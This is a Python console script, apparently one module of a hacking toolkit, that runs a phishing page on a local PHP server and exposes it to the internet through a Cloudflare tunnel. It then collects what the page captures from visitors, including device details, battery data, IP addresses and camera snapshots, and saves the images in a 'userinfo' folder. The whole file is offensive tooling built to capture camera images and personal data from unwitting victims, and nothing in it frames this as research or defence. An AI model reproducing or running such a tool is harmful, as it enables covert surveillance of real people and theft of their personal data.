import cmd
import json
import os
import subprocess
import sys
import time
class hising_came(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt="\033[92mH-king@console \033[0m(\033[91mphising_site/phising_camera\033[0m) \033[92m>\033[0m "
    def do_clear(self,args):
        os.system("clear")
    def do_back(self,args):
        sys.exit()
    def do_EOF(self,args):
        subprocess.getoutput("killall python *.py")
    def do_run(self,args):
        os.system("rm -rf start/phising_site/*.png")
        print("          ctrl+c for quit")
        os.system("php -S localhost:3333 -t start/phising_site > /dev/null 2>&1 &")
        os.system("cloudflare http 3333 -s")
        path="start/phising_site/user_data.json"
        path2="start/phising_site/user_battery.json"
        path3="start/phising_site/Log.log"
        while True:
            if(os.path.isfile(path) and os.path.isfile(path2)):
                    print("\033[92mlink open by user\033[0m")
                    time.sleep(2)
                    print("\033[92muser data is reseved\033[0m")
                    time.sleep(1)
                    user_detail=open(path,'r')
                    user_battery=open(path2,'r')
                    detail_obj=json.load(user_detail)
                    for key,value in detail_obj.items() :
                        print(f"{key} : {value}")
                    user_detail.close()
                    battry_detail=json.load(user_battery)
                    for key,value in battry_detail.items():
                        print(f"{key} : {value}")
                        os.system("rm -rf start/phising_site/*.json")
                        os.system("cat start/phising_site/ip.txt")
                        os.system("rm -rf start/phising_site/ip.txt")
                    user_battery.close()
                    if(not os.path.isdir("userinfo")):
                        os.system("mkdir userinfo")

                    else:
                        pass
                    if(os.path.isfile("start/phising_site/pernot.txt")):
                        print("\033[91mCamera Permisson not allow\033[0m")
                        os.system("rm -rf start/phising_site/pernot.txt")
            if(os.path.isfile("start/phising_site/Log.log")):
                print("\033[92mreceve image\033[0m")
                os.system("cp -r start/phising_site/*.png userinfo")
                os.system("rm -rf start/phising_site/Log.log")

try:
    hising_came().cmdloop()
except KeyboardInterrupt as e:
    pass
